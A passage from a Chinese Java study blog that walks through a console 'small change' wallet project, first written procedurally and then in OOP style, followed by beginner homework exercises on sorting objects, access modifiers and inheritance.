跳过），shift+F8（跳出），F9（resume，执行到下一个断点）</li></ul></li><li><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220927230227174.png" alt="image-20220927230227174" style="zoom:50%;" /></li></ul><h2 id="项目-零钱通"><a href="#项目-零钱通" class="headerlink" title="项目-零钱通"></a>项目-零钱通</h2><blockquote><p>项目需求：</p><p>使用Java 开发 零钱通项目，可以完成收益入账，消费，查看明细，退出系统等功能。</p><p>项目界面：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220928004832871.png" alt="image-20220928004832871" style="zoom:50%;" /></blockquote><h3 id="1-过程编程"><a href="#1-过程编程" class="headerlink" title="1.过程编程"></a>1.过程编程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.smallchange;<br><br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmallChangeSys</span> &#123;<br>    <span class="hljs-comment">//化繁为简</span><br>    <span class="hljs-comment">//1.先完成显示菜单，并可以选择菜单，给出对于提示</span><br>    <span class="hljs-comment">//2.完成零钱通明细</span><br>    <span class="hljs-comment">//3.完成收益入账</span><br>    <span class="hljs-comment">//4.完成消费</span><br>    <span class="hljs-comment">//5.改善</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//定义相关的变量</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">loop</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-comment">//创建scanner对象</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        <span class="hljs-comment">//2.完成零钱通明细（1）可以把收益入账和消费，保存到数组（2）可以使用对象（3）简单的话可以使用String拼接</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">details</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;---------零钱通明细---------\n&quot;</span>;<br>        <span class="hljs-comment">//3.完成收益入账 定期新的变量</span><br>        <span class="hljs-type">double</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">double</span> <span class="hljs-variable">balance</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">//data是java.util包的方法</span><br>        <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm&quot;</span>); <span class="hljs-comment">//用于日期格式化的</span><br>        <span class="hljs-comment">//4.完成消费</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">note</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-comment">//5.完善</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">sele</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;---------零钱通菜单---------&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\t\t\t1 零钱通明细&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\t\t\t2 收益入账&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\t\t\t3 消费&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\t\t\t4 退     出&quot;</span>);<br>            System.out.print(<span class="hljs-string">&quot;请选择(1-4):&quot;</span>);<br>            key = scanner.next();<br>            <span class="hljs-comment">//使用switch控制分支</span><br>            <span class="hljs-keyword">switch</span> (key)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;1&quot;</span>:<br>                    System.out.println(details);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;2&quot;</span>:<br>                    System.out.print(<span class="hljs-string">&quot;收益入账金额：&quot;</span>);<br>                    money = scanner.nextDouble();<br>                    <span class="hljs-comment">//校验</span><br>                    <span class="hljs-comment">//找出不正确的金额条件，然后给出提示即可</span><br>                    <span class="hljs-keyword">if</span>(money &lt;=<span class="hljs-number">0</span>)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;收益入账金额 需要 大于等于0&quot;</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    balance +=money;<br>                    <span class="hljs-comment">//拼接收益入账信息到 details</span><br>                    date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(); <span class="hljs-comment">//获取当前日期</span><br>                    details += <span class="hljs-string">&quot;\t收益入账\t+&quot;</span> + money + <span class="hljs-string">&quot;\t&quot;</span> +sdf.format(date) +<span class="hljs-string">&quot;\t余额:&quot;</span>+balance+<span class="hljs-string">&quot;\n&quot;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;3&quot;</span>:<br>                    System.out.print(<span class="hljs-string">&quot;消费金额：&quot;</span>);<br>                    money = scanner.nextDouble();<br>                    <span class="hljs-keyword">if</span> (money&lt;=<span class="hljs-number">0</span> || money &gt; balance)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;你的消费金额 应该在 0-&quot;</span> + balance);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    System.out.print(<span class="hljs-string">&quot;消费说明：&quot;</span>);<br>                    note = scanner.next();<br>                    balance -= money;<br>                    details += <span class="hljs-string">&quot;\t&quot;</span>+note+<span class="hljs-string">&quot;\t-&quot;</span>+ money +<span class="hljs-string">&quot;\t&quot;</span> +sdf.format(date) +<span class="hljs-string">&quot;\t余额:&quot;</span>+balance+<span class="hljs-string">&quot;\n&quot;</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;4&quot;</span>:<br>                    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;你确定要退出吗？y/n&quot;</span>);<br>                        sele = scanner.next();<br>                        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;y&quot;</span>.equals(sele) || <span class="hljs-string">&quot;n&quot;</span>.equals(sele))&#123;<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">if</span> (sele.equals(<span class="hljs-string">&quot;y&quot;</span>))&#123;<br>                        loop = <span class="hljs-literal">false</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    System.out.println(<span class="hljs-string">&quot;选择有误，请重新选择&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">while</span>(loop);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2-OOP编程"><a href="#2-OOP编程" class="headerlink" title="2.OOP编程"></a>2.OOP编程</h3><p>SmallChangeSysOOP：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.smallchange;<br><br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 该类是完成零钱通的各个功能的类</span><br><span class="hljs-comment"> * 使用OOP（面向对象）</span><br><span class="hljs-comment"> * 将各个功能对应一个方法</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmallChangeSysOOP</span> &#123;<br>    <span class="hljs-comment">//定义相关的变量</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">loop</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-comment">//创建scanner对象</span><br>    <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>    <span class="hljs-comment">//2.完成零钱通明细（1）可以把收益入账和消费，保存到数组（2）可以使用对象（3）简单的话可以使用String拼接</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">details</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;---------零钱通明细---------\n&quot;</span>;<br>    <span class="hljs-comment">//3.完成收益入账 定期新的变量</span><br>    <span class="hljs-type">double</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">double</span> <span class="hljs-variable">balance</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">//data是java.util包的方法</span><br>    <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd HH:mm&quot;</span>); <span class="hljs-comment">//用于日期格式化</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">note</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sele</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-comment">//1.先完成显示菜单，并可以选择菜单，给出对于提示</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">mainMenu</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">do</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;---------零钱通菜单---------&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\t\t\t1 零钱通明细&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\t\t\t2 收益入账&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\t\t\t3 消费&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;\t\t\t4 退     出&quot;</span>);<br>            System.out.print(<span class="hljs-string">&quot;请选择(1-4):&quot;</span>);<br>            key = scanner.next();<br>            <span class="hljs-comment">//使用switch控制分支</span><br>            <span class="hljs-keyword">switch</span> (key)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;1&quot;</span>:<br>                    <span class="hljs-built_in">this</span>.detail();<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;2&quot;</span>:<br>                    <span class="hljs-built_in">this</span>.income();<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;3&quot;</span>:<br>                    <span class="hljs-built_in">this</span>.pay();<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;4&quot;</span>:<br>                    <span class="hljs-built_in">this</span>.exit();<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    System.out.println(<span class="hljs-string">&quot;选择有误，请重新选择&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">while</span>(loop);<br>    &#125;<br><br>    <span class="hljs-comment">//2.完成零钱通明细</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">detail</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(details);<br>    &#125;<br>    <span class="hljs-comment">//3.完成收益入账</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">income</span><span class="hljs-params">()</span>&#123;<br>        System.out.print(<span class="hljs-string">&quot;收益入账金额：&quot;</span>);<br>        money = scanner.nextDouble();<br>        <span class="hljs-keyword">if</span> (money&lt;=<span class="hljs-number">0</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;收益入账金额 需要 大于等于0&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<span class="hljs-comment">//退出方法，不再执行后面的代码</span><br>        &#125;<br>        balance +=money;<br>        <span class="hljs-comment">//拼接收益入账信息到 details</span><br>        date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(); <span class="hljs-comment">//获取当前日期</span><br>        details += <span class="hljs-string">&quot;\t收益入账\t+&quot;</span> + money + <span class="hljs-string">&quot;\t&quot;</span> +sdf.format(date) +<span class="hljs-string">&quot;\t余额:&quot;</span>+balance+<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//4.完成消费</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">()</span>&#123;<br>        System.out.print(<span class="hljs-string">&quot;消费金额：&quot;</span>);<br>        money = scanner.nextDouble();<br>        <span class="hljs-keyword">if</span> (money&lt;=<span class="hljs-number">0</span> || money &gt; balance)&#123;<br>            System.out.println(<span class="hljs-string">&quot;你的消费金额 应该在 0-&quot;</span> + balance);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        System.out.print(<span class="hljs-string">&quot;消费说明：&quot;</span>);<br>        note = scanner.next();<br>        balance -= money;<br>        details += <span class="hljs-string">&quot;\t&quot;</span>+note+<span class="hljs-string">&quot;\t-&quot;</span>+ money +<span class="hljs-string">&quot;\t&quot;</span> +sdf.format(date) +<span class="hljs-string">&quot;\t余额:&quot;</span>+balance+<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>    <span class="hljs-comment">//5.退出</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exit</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;你确定要退出吗？y/n&quot;</span>);<br>            sele = scanner.next();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;y&quot;</span>.equals(sele) || <span class="hljs-string">&quot;n&quot;</span>.equals(sele))&#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (sele.equals(<span class="hljs-string">&quot;y&quot;</span>))&#123;<br>            loop = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>SmallChangeSysApp：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmallChangeSysApp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmallChangeSysOOP</span>().mainMenu();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220928181030219.png" alt="image-20220928181030219" style="zoom:50%;" /><p>比起过程编程，OOP更容易管理和添加功能。</p><h2 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><blockquote><p>定义一个Person类 ｛name， age， job｝， 初始化Person 对象数组，有3个person对象，并 按照 age 从 大到 小进行排序，提示，使用冒泡排序 Homework01.java</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//对象数组</span><br>        Person[] persons = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>[<span class="hljs-number">3</span>];<br>        persons[<span class="hljs-number">0</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;tim&quot;</span>, <span class="hljs-number">27</span>, <span class="hljs-string">&quot;student&quot;</span>);<br>        persons[<span class="hljs-number">1</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;pat&quot;</span>, <span class="hljs-number">21</span>, <span class="hljs-string">&quot;farmer&quot;</span>);<br>        persons[<span class="hljs-number">2</span>] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&quot;driver&quot;</span>);<br>        <span class="hljs-comment">//冒泡排序</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span><span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; persons.length; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; j &lt; persons.length - <span class="hljs-number">1</span> - i; j++) &#123;<br><span class="hljs-comment">//                System.out.println(&quot;j=&quot;+j);</span><br>                <span class="hljs-keyword">if</span> (persons[j].getAge() &gt; persons[j + <span class="hljs-number">1</span>].getAge()) &#123;<br>                    tmp = persons[j + <span class="hljs-number">1</span>];<br>                    persons[j + <span class="hljs-number">1</span>] = persons[j];<br>                    persons[j] = tmp;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; persons.length; i++) &#123;<br>            System.out.println(persons[i]);<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> String job;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, job=&#x27;&quot;</span> + job + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, String job)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.job = job;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getJob</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> job;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setJob</span><span class="hljs-params">(String job)</span> &#123;<br>        <span class="hljs-built_in">this</span>.job = job;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220928200832447.png" alt="image-20220928200832447" style="zoom:50%;" /><h3 id="2-权限"><a href="#2-权限" class="headerlink" title="2 权限"></a>2 权限</h3><blockquote><p>写出四种访问修饰符和各自的访问权限 Homework02.java</p></blockquote><table><thead><tr><th></th><th>本类</th><th>同包</th><th>子类</th><th>不同包</th></tr></thead><tbody><tr><td>Private</td><td></td><td></td><td></td><td></td></tr><tr><td>Protected</td><td></td><td></td><td></td><td></td></tr><tr><td>默认</td><td></td><td></td><td></td><td></td></tr><tr><td>Public</td><td></td><td></td><td></td><td></td></tr></tbody></table><p>答案于修饰符章节。</p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><blockquote><p>通过继承实现员工工资核算打印功能<br>父类:员工类<br>子类:部门经理类、普通员工类<br>（1）部门经理工资＝1000＋单日工资＊天数＊等级（1.2）。<br>（2）普通员工工资＝单日工资＊天数＊等级（1.0）；<br>（3） 员工属性：姓名，单日工资，工作天数<br>（4）员工方法（打印工资）<br>（5）普遍员工及部门经理都是员工子类，需要重写打印工资方法。<br>（5）定义并初始化普通员工对象，调用打印工资方法输入工资，定义并初始化部门经理对象调用打印工资方法输入工资</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 